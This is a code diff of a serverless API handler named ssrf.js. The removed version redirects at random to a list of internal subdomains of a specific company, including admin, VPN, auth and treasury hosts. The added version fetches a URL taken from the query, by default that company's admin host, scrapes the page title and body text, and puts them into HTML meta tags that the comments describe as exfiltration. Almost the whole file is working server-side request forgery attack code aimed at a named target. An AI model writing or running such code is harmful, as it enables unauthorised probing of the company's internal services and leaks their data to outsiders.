@@ -1,49 +1,60 @@
-// pages/api/ssrf.js (Vercel Serverless Function)
-const targets = [
-  'http://admin.bumba.global/',
-  'http://admin.status.bumba.global/',
-  'http://cms.bumba.global/',
-  'http://sandbox-auth.bumba.global/',
-  'http://tcms.bumba.global/',
-  'http://eramba.bumba.global/',
-  'http://redmine.bumba.global/',
-  'http://auth.bumba.global/',
-  'http://vpn.bumba.global/',
-  'http://fireblocks-api.bumba.global/',
-  'http://middleware-api.bumba.global/',
-  'http://sandbox1.bumba.global/',
-  'http://app-staging.bumba.global/',
-  'http://b2c2-hedging-adapter.bumba.global/',
-  'http://status.bumba.global/',
-  'http://ap.bumba.global/',
-  'http://treasury-api.bumba.global/',
-  'http://cms-staging.bumba.global/',
-  'http://fireblocks-mainnet.bumba.global/',
-  'http://treasury-sandbox.bumba.global/',
-  'http://autodiscover.bumba.global/',
-  'http://elk.bumba.global/',
-  'http://fns-login.bumba.global/',
-  'http://middleware-api-sandbox.bumba.global/',
-  'http://treasury.bumba.global/',
-  'http://treasury-sandbox-login.bumba.global/',
-  'http://treasury-api-v2.bumba.global/',
-  'http://lyncdiscover.bumba.global/',
-  'http://sandbox.bumba.global/',
-  'http://coinbase-hedging-adapter.bumba.global/',
-  'http://treasury-api-sandbox.bumba.global/',
-  'http://middleware-api-sandbox1.bumba.global/',
-  'http://tm.bumba.global/',
-  'http://mm.bumba.global/',
-  'http://msoid.bumba.global/',
-  'http://exchange-api.bumba.global/',
-];
+// pages/api/ssrf.js
 
-export default function handler(req, res) {
-  const index = Math.floor(Math.random() * targets.length);
-  const redirectTarget = targets[index];
+export default async function handler(req, res) {
+  const target = req.query.url || 'http://admin.bumba.global';
 
-  res.writeHead(302, {
-    Location: redirectTarget
-  });
-  res.end();
+  try {
+    const response = await fetch(target, {
+      method: 'GET',
+      redirect: 'follow',
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (SSRF-Scanner)'
+      }
+    });
+
+    const body = await response.text();
+
+    // Try to extract some data to exfiltrate
+    const titleMatch = body.match(/<title>(.*?)<\/title>/i);
+    const bodyMatch = body.match(/<body[^>]*>([\s\S]*?)<\/body>/i);
+
+    const title = titleMatch ? titleMatch[1].trim() : 'No Title Found';
+    const snippet = bodyMatch ? bodyMatch[1].replace(/<[^>]*>?/gm, '').slice(0, 150).trim() : 'No body content';
+
+    // Construct exfiltration in metadata
+    const html = `
+      <!DOCTYPE html>
+      <html>
+        <head>
+          <title>SSRF: ${title}</title>
+          <meta name="description" content="Snippet: ${snippet}">
+          <meta property="image" content="${target}/favicon.ico">
+        </head>
+        <body>
+          <h1>SSRF Metadata Exfiltration</h1>
+          <p>Target: ${target}</p>
+          <pre>${snippet}</pre>
+        </body>
+      </html>
+    `;
+
+    res.setHeader('Content-Type', 'text/html');
+    res.status(200).send(html);
+
+  } catch (err) {
+    console.error('❌ SSRF fetch failed:', err);
+    res.status(200).send(`
+      <html>
+        <head>
+          <title>SSRF Error</title>
+          <meta name="description" content="Failed to fetch: ${target}">
+          <meta property="image" content="https://http.cat/500">
+        </head>
+        <body>
+          <h1>SSRF Error</h1>
+          <pre>${err.toString()}</pre>
+        </body>
+      </html>
+    `);
+  }
 }
